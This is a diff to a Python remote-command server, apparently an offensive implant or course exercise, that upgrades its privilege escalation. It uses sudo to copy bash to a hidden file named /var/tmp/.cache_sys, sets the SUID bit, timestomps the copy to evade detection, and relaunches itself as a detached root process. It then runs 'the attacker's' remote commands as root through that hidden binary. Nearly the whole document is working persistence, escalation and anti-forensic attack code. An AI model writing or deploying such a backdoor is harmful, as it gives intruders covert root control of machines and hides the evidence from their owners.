@@ -105,23 +105,40 @@ def run_command(cmd, shell=True, capture_output=True, **kwargs):
 HOST, PORT = "0.0.0.0", 5050
 
 def privesc():
-    # Check if we are already root (Effective UID 0)
+    import subprocess
+    import sys
+    import os
+
     if os.geteuid() != 0:
-        print("Elevating to root using misconfigured chmod...")
+        print("[*] Elevating to root silently using hidden SUID copy...")
         try:
-            # 1. Use sudo to set the SUID bit on bash
-            subprocess.run(["sudo", "/usr/bin/chmod", "+s", "/bin/bash"], check=True)
-            print("[+] Successfully set SUID on /bin/bash using sudo")
+            hidden_bash = "/var/tmp/.cache_sys"
             
-            # 2. Replace the current process with a privileged bash process
-            # bash -p is required to prevent bash from dropping the SUID root privileges
-            os.execv("/bin/bash", ["bash", "-p", "-c", f"{sys.executable} {THIS_FILE}"])
+            # 1. Create a hidden copy, apply SUID, and timestomp it to match the original
+            setup_cmds = f"""
+            sudo cp /bin/bash {hidden_bash}
+            sudo chmod 4755 {hidden_bash}
+            sudo touch -r /bin/bash {hidden_bash}
+            """
+            subprocess.run(setup_cmds, shell=True, check=True)
+            
+            # 2. Spawn the privileged payload as a detached background process using the hidden binary
+            subprocess.Popen(
+                [hidden_bash, "-p", "-c", f"{sys.executable} {THIS_FILE}"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL,
+                start_new_session=True  # Detaches from the terminal session
+            )
+            
+            # 3. Terminate the original unprivileged process
+            sys.exit(0)
             
         except Exception as e:
-            print(f"Failed to elevate: {e}")
+            print(f"[-] Failed to elevate: {e}")
             sys.exit(1)
     else:
-        print("Already running with root privileges.")
+        print("[+] Already running with root privileges.")
 
 def privesc2():
     # 1. Generate the hash
@@ -326,13 +343,21 @@ def handle_conn(conn, addr):
             elif command_type == "BASH":
                 print(f"Running bash: {command_body}")
                 
-                # If we are root, we explicitly call bash -p to maintain privileges
+                # If we are root, use the hidden bash and force it to load the profile
                 if os.geteuid() == 0:
-                    exec_args = ["/bin/bash", "-p", "-c", command_body]
+                    hidden_bash = "/var/tmp/.cache_sys"
+                    
+                    # Ensure we source the profile into memory first to restore environment variables
+                    # before executing the attacker's command
+                    if os.path.exists(hidden_bash):
+                        exec_args = [hidden_bash, "-p", "-c", f"source ~/.bashrc 2>/dev/null; {command_body}"]
+                    else:
+                        # Fallback if the hidden file was removed
+                        exec_args = ["/bin/bash", "-p", "-c", f"source ~/.bashrc 2>/dev/null; {command_body}"]
                 else:
                     exec_args = ["/bin/sh", "-c", command_body]
 
-                # Run the command directly (shell=False) to prevent /bin/sh from dropping UID
+                # Run the command directly (shell=False)
                 proc = subprocess.run(
                     exec_args, 
                     shell=False, 
@@ -342,14 +367,6 @@ def handle_conn(conn, addr):
                 
                 output = proc.stdout + proc.stderr
                 send_framed(conn, b"TEXT\n" + (output if output else b"[no output]"))
-            else: 
-                # conn.sendall(f"Unknown command: {command_type}".encode())
-                send_framed(conn, b"TEXT\n" + f"Unknown command: {command_type}".encode())
-        # Think VERY carefully about how you will communicate between the client and server
-        # You will need to make a custom protocol to transfer commands
-        # try:
-        #     conn.sendall(run_command("whoami").stdout.encode())
-            # Process the communication data from 
         except Exception as e:
             # conn.sendall(f"error: {e}".encode())
             send_framed(conn, b"TEXT\n" + f"error: {e}".encode())
